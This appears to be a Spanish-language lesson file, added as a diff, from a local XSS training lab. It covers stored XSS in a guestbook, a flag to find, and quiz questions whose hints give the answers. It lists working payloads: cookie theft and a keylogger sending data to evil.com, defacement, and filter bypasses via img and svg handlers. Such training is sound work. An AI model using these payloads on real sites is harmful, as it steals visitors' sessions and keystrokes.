@@ -1,0 +1,70 @@
+---
+index: 2
+title: "Stored XSS: el veneno que persiste"
+questions:
+  - id: xss-reflejado-t02-q01
+    prompt: "¿Qué tipo de XSS es MÁS peligroso: reflected o stored?"
+    hint: "El stored queda guardado y afecta a todos los que ven la página."
+    kind: choice
+    options:
+      - id: a
+        label: "Reflected: es más directo"
+      - id: b
+        label: "Stored: se ejecuta automáticamente en CADA visitante sin necesidad de clic"
+      - id: c
+        label: "Son igual de peligrosos"
+      - id: d
+        label: "Ninguno es peligroso con HTTPS"
+  - id: xss-reflejado-t02-q02
+    prompt: "¿Qué cookie del documento es el objetivo clásico de un payload XSS?"
+    hint: "document.cookie — roba la sesión."
+    kind: text
+---
+
+## Stored XSS: envenena una vez, afecta a todos
+
+El lab tiene un **guestbook** (`/guestbook`). Prueba a publicar algo:
+
+```bash
+# Post normal
+curl "http://127.0.0.1:18082/post?name=Hacker&message=Hola%20a%20todos"
+
+# Post con XSS
+curl "http://127.0.0.1:18082/post?name=%3Cscript%3Ealert('Stored!')%3C/script%3E&message=Gotcha"
+```
+
+Ahora CUALQUIERA que visite `/guestbook` ve tu `<script>` ejecutándose. No necesita
+clic en ningún enlace — simplemente al cargar la página, tu código corre.
+
+## La flag del guestbook
+
+Hay una entrada de "admin" en el guestbook con un mensaje interno. Visita:
+
+```bash
+curl "http://127.0.0.1:18082/guestbook"
+```
+
+Busca el mensaje del admin. Contiene **FLAG_2** — pero en una app real estaría oculto
+(visible solo para admin). Con un payload XSS que haga `document.body.innerHTML`, un
+usuario normal podría ver todo el contenido.
+
+## Payloads XSS que debes conocer
+
+```javascript
+// Clásico
+<script>alert('XSS')</script>
+
+// Robar cookies
+<script>fetch('http://evil.com/steal?c='+document.cookie)</script>
+
+// Keylogger
+<script>document.onkeypress=function(e){fetch('http://evil.com/key?k='+e.key)}</script>
+
+// Defacement
+<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
+
+// Bypass de filtros básicos (sin <script>)
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+```
